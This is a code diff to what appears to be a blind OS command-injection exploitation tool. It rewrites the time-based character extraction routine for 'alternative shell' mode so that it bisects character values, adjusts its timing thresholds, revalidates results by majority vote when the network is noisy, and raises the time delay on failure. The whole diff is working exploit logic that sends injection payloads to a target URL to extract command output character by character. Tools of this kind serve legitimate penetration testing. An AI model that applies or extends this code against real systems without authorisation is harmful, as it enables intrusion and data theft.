@@ -608,19 +608,70 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       return ascii_char, conn_error_flag
 
     def _extract_position(num_of_chars):
+      nonlocal timesec
       char_pool = checks.generate_char_pool(num_of_chars)
 
       if alter_shell:
         # Alternative shells are still experimental.
-        for ascii_char in char_pool:
-          if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-            payload = payloads.get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method)
-          else:
-            payload = payloads.get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, timesec, http_request_method)
+        target = cmd if technique == settings.INJECTION_TECHNIQUE.TIME_BASED else OUTPUT_TEXTFILE
+
+        def _delayed(candidate, operator, local_timesec):
+          payload = payloads.get_char_alter_shell(separator, target, num_of_chars, candidate, local_timesec, http_request_method, operator=operator)
           exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
-          if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
-            return num_of_chars, ascii_char, False
-        return num_of_chars, None, False
+          # Use the adaptive threshold instead of fixed values calibrated to a timesec that may have shrunk.
+          return checks.time_related_shell(url_time_response, exec_time, local_timesec)
+
+        def _bisect(local_timesec):
+          lo, hi = min(char_pool) - 1, max(char_pool)
+          while hi - lo > 1:
+            mid = (lo + hi) // 2
+            if _delayed(mid, "-le", local_timesec):
+              lo = mid
+            else:
+              hi = mid
+          return lo if lo >= min(char_pool) else None
+
+        # Verify the bisection boundary independently; a noisy read can permanently steer it wrong.
+        def _boundary_holds(candidate, local_timesec):
+          if not _delayed(candidate, "-le", local_timesec):
+            return False
+          if candidate + 1 <= max(char_pool) and _delayed(candidate + 1, "-le", local_timesec):
+            return False
+          return True
+
+        def _validate(candidate, local_timesec):
+          if settings.JITTER_SEEN:
+            votes = [_boundary_holds(candidate, local_timesec) for _ in range(3)]
+            holds = votes.count(True) >= 2
+          else:
+            holds = _boundary_holds(candidate, local_timesec) and _boundary_holds(candidate, local_timesec)
+          return holds and _delayed(candidate, "-eq", local_timesec)
+
+        revalidations = 0
+        original_timesec = timesec
+        candidate = _bisect(timesec)
+        while True:
+          try:
+            validated = candidate is not None and _validate(candidate, timesec)
+          except KeyboardInterrupt:
+            checks.handle_exploitation_interrupt(filename, url)
+            continue
+          if validated:
+            return num_of_chars, candidate, False
+          was_jittery = settings.JITTER_SEEN
+          settings.JITTER_SEEN = True
+          settings.ADJUST_TIME_DELAY_DISABLED = True
+          max_revalidations = settings.MAX_LENGTH_REVALIDATIONS * (3 if was_jittery else 1)
+          if revalidations >= max_revalidations:
+            with timesec_lock:
+              timesec = settings.CALIBRATED_TIMESEC = original_timesec
+            return num_of_chars, None, True
+          revalidations += 1
+          settings.print_data_to_stdout(settings.print_error_msg("Invalid character detected. Retrying."))
+          if settings.ADJUST_TIME_DELAY_CHOICE != False:
+            with timesec_lock:
+              timesec = settings.CALIBRATED_TIMESEC = timesec + settings.TIME_DELAY_STEP
+          candidate = _bisect(timesec)
 
       # One bisection per position - the corruption check below catches systematic bias instead.
       ascii_char, conn_error_flag = _bisect_once(num_of_chars, char_pool)
